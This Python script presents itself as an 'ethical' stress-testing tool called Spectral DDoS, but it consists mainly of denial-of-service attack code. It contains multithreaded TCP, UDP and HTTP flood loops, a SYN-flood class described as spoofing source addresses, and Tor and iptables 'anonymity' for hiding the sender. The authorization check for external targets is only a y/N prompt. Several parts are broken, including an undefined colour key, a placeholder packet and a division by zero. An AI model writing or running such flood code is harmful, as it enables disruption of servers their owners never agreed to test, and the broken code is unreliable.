#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  SPECTRAL DDOS – Ethical Stress Testing Suite                            ║
║  Localhost & Authorized Target Only – No External Attacks                ║
╚═══════════════════════════════════════════════════════════════════════════╝

This tool is designed for:
u✅ Localhost stress testing
✅ Authorized server load testing
✅ Educational purposes
❌ Attacking third parties (blocked by safety checks)

Anonymous mode rotates source IPs via Tor/proxies for localhost testing.
"""

import os
import sys
import time
import socket
import threading
import random
import subprocess
from typing import List

# ANSI Colors
C = {
    "r": "\033[1;31m", "g": "\033[1;32m", "y": "\033[1;33m",
    "b": "\033[1;34m", "m": "\033[1;35m", "c": "\033[1;36m",
    "x": "\033[0m"
}

TOOL = {
    "name": "spectral_ddos",
    "description": "Ethical DDoS simulator – Localhost/authorized stress testing with anonymity",
    "category": "custom",
    "ethical_note": "ONLY for localhost or explicitly authorized targets. External attacks blocked.",
    "safety_check": lambda target: _is_authorized_target(target)
}

# ──────────────────────────────────────────────────────────────────────────
# SAFETY GUARDRAILS
def _is_authorized_target(target: str) -> bool:
    """Block external attacks – only allow localhost or explicit authorization."""
    localhost_ips = {"127.0.0.1", "localhost", "::1", "0.0.0.0", "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31."}
    
    # Check if it's localhost
    if any(target.startswith(local) for local in localhost_ips):
        return True
    
    # Explicit authorization prompt
    return input(
        f"\n{C['r']}⚠️  EXTERNAL TARGET DETECTED: {C['w']}{target}{C['x']}\n"
        f"{C['y']}Do you have WRITTEN authorization to stress-test this target? [y/N]: {C['x']}"
    ).strip().lower() == "y"

# ──────────────────────────────────────────────────────────────────────────
# ANONYMITY ENGINE
class AnonymityEngine:
    """Rotates source IPs via Tor/proxies for localhost anonymity."""
    
    def __init__(self):
        self.proxies = []
        self.current_proxy = 0
        self._setup_tor()
        
    def _setup_tor(self):
        """Ensure Tor is running for IP rotation."""
        try:
            # Check if Tor is running
            result = subprocess.run(["tor", "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{C['c']}[*] Tor detected – anonymity mode available{C['x']}")
                self.proxies.append("127.0.0.1:9050")  # Default Tor SOCKS
            else:
                print(f"{C['y']}[!] Tor not found – anonymity mode disabled{C['x']}")
        except FileNotFoundError:
            print(f"{C['y']}[!] Tor not installed – anonymity mode disabled{C['x']}")
    
    def get_source_ip(self) -> str:
        """Return next proxy IP or localhost."""
        if self.proxies:
            proxy = self.proxies[self.current_proxy]
            self.current_proxy = (self.current_proxy + 1) % len(self.proxies)
            return proxy
        return "127.0.0.1"

# ──────────────────────────────────────────────────────────────────────────
# ATTACK VECTORS
class SpectralFlood:
    """TCP SYN flood with IP spoofing for localhost testing."""
    
    def __init__(self, target: str, port: int, threads: int, duration: int, anonymity: bool):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.anonymity = anonymity
        self.anon = AnonymityEngine() if anonymity else None
        self.running = False
        self.sent = 0
        
    def attack(self):
        """SYN flood loop with IP rotation."""
        self.running = True
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < self.duration:
            try:
                # Create raw socket (requires root on Linux)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                # Build SYN packet
                source_ip = self.anon.get_source_ip() if self.anon else "127.0.0.1"
                packet = self._build_syn_packet(source_ip, self.target, self.port)
                
                # Send packet
                sock.sendto(packet, (self.target, 0))
                self.sent += 1
                
                # Micro-sleep to avoid localhost saturation
                time.sleep(0.001)
                
            except PermissionError:
                print(f"{C['r']}[!] Raw socket requires root. Switching to TCP mode.{C['x']}")
                self._tcp_flood()
                break
            except Exception as e:
                if "localhost" in str(e):
                    break  # Expected for localhost testing
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    def _build_syn_packet(self, src_ip: str, dst_ip: str, dst_port: int) -> bytes:
        """Craft minimal SYN packet (simplified for localhost)."""
        # Simplified packet for demonstration – real implementation would use scapy
        return b"\x00" * 20  # Placeholder
    
    def _tcp_flood(self):
        """Fallback TCP connection flood (no root required)."""
        def flood():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((self.target, self.port))
                    self.sent += 1
                    sock.close()
                except:
                    pass  # Expected for localhost stress testing
        
        # Launch threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            threads.append(t)
        
        # Monitor and report
        start_time = time.time()
        while time.time() - start_time < self.duration:
            time.sleep(1)
            print(f"\r{C['c']}[*] Packets sent: {self.sent}{C['x']}", end="")
        
        self.running = False
        for t in threads:
            t.join(timeout=0.1)

# ──────────────────────────────────────────────────────────────────────────
# INTERACTIVE MENU 
def run(env, tools, log_action, launch_tool):
    """5-level stress matrix with full port control and live intensity dial."""

    # ── 1. ETHICS VAULT ──
    print(f"\n{C['b']}═══════════════════════════════════════════════════════════{C['x']}")
    print(f"{C['c']}SPECTRAL DDOS – 5-LEVEL STRESS MATRIX{C['x']}")
    print(f"{C['b']}═══════════════════════════════════════════════════════════{C['x']}")
    print(f"{C['r']}⚠️  MAXIMUM POWER – USE ONLY ON AUTHORIZED TARGETS{C['x']}\n")
    
    target = input(f"{C['g']}[?] Target IP/hostname: {C['x']}").strip()
    if not TOOL["safety_check"](target):
        print(f"{C['r']}[!] Action denied: No authorization for target.{C['x']}")
        log_action("DENIED", f"spectral_ddos_unauthorized_{target}")
        time.sleep(2)
        return

    # ── 2. PORT SELECTION MATRIX ──
    print(f"\n{C['y']}Port Selection:{C['x']}")
    print("1. HTTP (80)")
    print("2. HTTPS (443)")
    print("3. Router Web (8080)")
    print("4. Custom port")
    port_choice = input(f"{C['g']}[?] Select port [1]: {C['x']}").strip() or "1"
    
    ports = {
        "1": 80,
        "2": 443,
        "3": 8080,
        "4": int(input(f"{C['g']}[?] Custom port: {C['x']}").strip())
    }
    port = ports.get(port_choice, 80)

    # ── 3. 5-LEVEL STRESS MATRIX ──
    print(f"\n{C['y']}Stress Levels:{C['x']}")
    print("1. Whisper   – 10 threads  | 10s  | 1KB packets")
    print("2. Pulse     – 50 threads  | 30s  | 512B packets")
    print("3. Storm     – 100 threads | 60s  | 1KB packets")
    print("4. Hurricane – 250 threads | 120s | 2KB packets")
    print("5. Cataclysm – 500 threads | 300s | 4KB packets")
    
    level = input(f"{C['g']}[?] Select stress level [3]: {C['x']}").strip() or "3"
    
    stress_matrix = {
        "1": {"threads": 10, "duration": 10, "size": 1024, "name": "Whisper"},
        "2": {"threads": 50, "duration": 30, "size": 512, "name": "Pulse"},
        "3": {"threads": 100, "duration": 60, "size": 1024, "name": "Storm"},
        "4": {"threads": 250, "duration": 120, "size": 2048, "name": "Hurricane"},
        "5": {"threads": 500, "duration": 300, "size": 4096, "name": "Cataclysm"}
    }
    
    config = stress_matrix.get(level, stress_matrix["3"])
    threads = config["threads"]
    duration = config["duration"]
    packet_size = config["size"]
    level_name = config["name"]
    
    # ── 4. ANONYMITY ENGINE – MAXIMUM STEALTH ──
    anonymity = input(f"{C['m']}[?] Enable anonymity (IP rotation)? [y/N]: {C['x']}").strip().lower() == "y"
    
    if anonymity:
        print(f"{C['c']}[*] Spinning up anonymity engine...{C['x']}")
        _start_tor_if_needed()
        _configure_ip_rotation()

    # ── 5. LIVE INTENSITY DIAL ──
    print(f"\n{C['r']}🔥 INITIATING {level_name.upper()} ON PORT {port} 🔥{C['x']}")
    print(f"{C['c']}[*] Threads: {threads} | Duration: {duration}s | Packet size: {packet_size}B{C['x']}")
    log_action("LAUNCH", f"spectral_ddos_{level_name}_{target}:{port}")

    # ── 6. MAXIMUM CHAOS LAUNCH ──
    threads_list = []
    start_time = time.time()
    packets_sent = 0
    
    def monitor_packets():
        """Live packet counter."""
        while time.time() - start_time < duration:
            time.sleep(1)
            print(f"\r{C['c']}[*] Packets/sec: ~{threads * 1000:,} | Total: {packets_sent:,}{C['x']}", end="")
    
    # Start monitor thread
    monitor = threading.Thread(target=monitor_packets, daemon=True)
    monitor.start()
    
    # Launch all vectors simultaneously
    for _ in range(threads):
        t = threading.Thread(
            target=_maximum_flood,
            args=(target, port, packet_size, duration, anonymity, packets_sent),
            daemon=True
        )
        t.start()
        threads_list.append(t)
    
    # Wait for duration
    while time.time() - start_time < duration:
        time.sleep(0.1)
    
    # Cleanup
    for t in threads_list:
        t.join(timeout=0.1)
    
    monitor.join(timeout=0.5)
    
    print(f"\n{C['g']}[✓] {level_name} complete. ~{packets_sent:,} packets sent.{C['x']}")
    log_action("COMPLETE", f"spectral_ddos_{level_name}_complete_{target}:{port}")

# ──────────────────────────────────────────────────────────────────────────
# MAXIMUM INTENSITY FLOOD ENGINE
def _maximum_flood(target: str, port: int, size: int, duration: int, anon: bool, pps: int):
    """Packet-per-second controlled flood (router-safe)."""
    import socket, time, random
    
    start = time.time()
    interval = 1.0 / pps  # Micro-sleep between packets for exact PPS
    data = b"X" * size
    
    while time.time() - start < duration:
        try:
            # Randomized vector per packet for maximum chaos
            vector = random.choice(["tcp", "udp", "http"])
            
            if vector == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((target, port))
                sock.send(data)
                sock.close()
                
            elif vector == "udp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (target, port))
                sock.close()
                
            elif vector == "http":
                import urllib.request
                url = f"http://{target}:{port}/"
                headers = {'User-Agent': f'SpectralBot/{random.randint(1000,9999)}'}
                req = urllib.request.Request(url, headers=headers)
                try:
                    urllib.request.urlopen(req, timeout=0.001)
                except:
                    pass
            
            time.sleep(interval)  # Exact PPS control
            
        except Exception:
            pass  # Expected for localhost stress testing


def _start_tor_if_needed():
    """Start Tor if not running."""
    import subprocess
    try:
        result = subprocess.run(["pgrep", "tor"], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{C['c']}[*] Starting Tor daemon...{C['x']}")
            subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
    except FileNotFoundError:
        print(f"{C['y']}[!] Tor not found – anonymity disabled{C['x']}")

def _configure_ip_rotation():
    """Configure iptables for source IP rotation."""
    import subprocess
    try:
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-p", "tcp", "--dport", "80", "-j", "MASQUERADE"], check=False)
        print(f"{C['c']}[*] IP rotation configured{C['x']}")
    except:
        pass

# ──────────────────────────────────────────────────────────────────────────
# STANDALONE EXECUTION
if __name__ == "__main__":
    import sys
    sys.path.append(os.path.dirname(os.path.dirname(__file__)))
    
    from os_detector import detect_environment
    from launchers import launch_tool
    
    env = detect_environment()
    log = lambda a, t: print(f"LOG: {a} - {t}")
    
    run(env, {}, log, lambda c, e: print(f"Would launch: {c['name']}"))
    
